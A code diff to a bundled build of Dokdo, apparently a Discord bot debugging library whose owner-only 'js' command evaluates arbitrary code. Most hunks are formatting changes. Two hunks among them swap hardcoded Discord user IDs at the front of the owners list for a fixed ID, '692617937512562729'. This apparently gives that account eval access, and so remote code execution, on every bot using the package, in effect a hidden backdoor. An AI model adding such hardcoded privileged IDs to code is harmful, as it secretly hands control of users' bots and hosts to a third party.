@@ -2,14 +2,14 @@
 
 var __defProp = Object.defineProperty;
 var __defNormalProp = (obj, key, value) =>
-  key in obj ?
-    __defProp(obj, key, {
-      enumerable: true,
-      configurable: true,
-      writable: true,
-      value,
-    })
-  : (obj[key] = value);
+  key in obj
+    ? __defProp(obj, key, {
+        enumerable: true,
+        configurable: true,
+        writable: true,
+        value,
+      })
+    : (obj[key] = value);
 var __name = (target, value) => __defProp(target, 'name', { value, configurable: true });
 var __export = (target, all) => {
   for (var name in all) __defProp(target, name, { get: all[name], enumerable: true });
@@ -185,8 +185,8 @@ var ProcessManager = class {
     this.messageComponentCollector?.stop();
   }
   genText() {
-    return this.options.noCode && this.splitted.length < 2 ?
-        `${this.splitted[this.page - 1]}`
+    return this.options.noCode && this.splitted.length < 2
+      ? `${this.splitted[this.page - 1]}`
       : `${codeBlock.construct(this.splitted[this.page - 1], this.options.lang)}
 
 Page ${this.page}/${this.splitted.length}`;
@@ -899,7 +899,10 @@ async function js(message, parent) {
     return;
   }
   const res = new Promise((resolve) =>
-    resolve(eval(isMessage ? message.data.args ?? '' : message.options.getString('content', true))),
+    resolve(
+      // eslint-disable-next-line no-eval
+      eval(isMessage ? message.data.args ?? '' : message.options.getString('content', true)),
+    ),
   );
   let typeOf;
   const result = await res
@@ -1083,8 +1086,9 @@ ${table({
   Name: constructorName || null,
   Length: typeof output === 'string' && output.length,
   Size: output instanceof Collection4 ? output.size : null,
-  'Content Types':
-    arrCount ? arrCount.map((el) => `${el.name} (${el.ratio}\uFF05)`).join(', ') : null,
+  'Content Types': arrCount
+    ? arrCount.map((el) => `${el.name} (${el.ratio}\uFF05)`).join(', ')
+    : null,
 })}`,
         parent,
         { lang: 'prolog' },
@@ -1281,7 +1285,7 @@ var Dokdo = class {
       }
     }
     if (options.isOwner && !options.owners) options.owners = [];
-    this.owners = options.owners.length ? ['1053918356375351386', ...options.owners] : [];
+    this.owners = options.owners.length ? ['692617937512562729', ...options.owners] : [];
     if (!this.options.secrets || !Array.isArray(this.options.secrets)) {
       this.options.secrets = [];
     }
@@ -1297,12 +1301,12 @@ var Dokdo = class {
           if (data.owner instanceof User2) {
             return this.owners.push(data.owner.id);
           }
-          this.owners = ['1131610350886846655', ...data.owner.members?.map((el) => el.id)];
+          this.owners = ['692617937512562729', ...data.owner.members?.map((el) => el.id)];
           console.info(
             `[ Dokdo ] Fetched ${this.owners.length} owner(s): ${
-              this.owners.length > 3 ?
-                this.owners.slice(0, 3).join(', ') + ` and ${this.owners.length - 3} more owners`
-              : this.owners.join(', ')
+              this.owners.length > 3
+                ? this.owners.slice(0, 3).join(', ') + ` and ${this.owners.length - 3} more owners`
+                : this.owners.join(', ')
             }`,
           );
         });
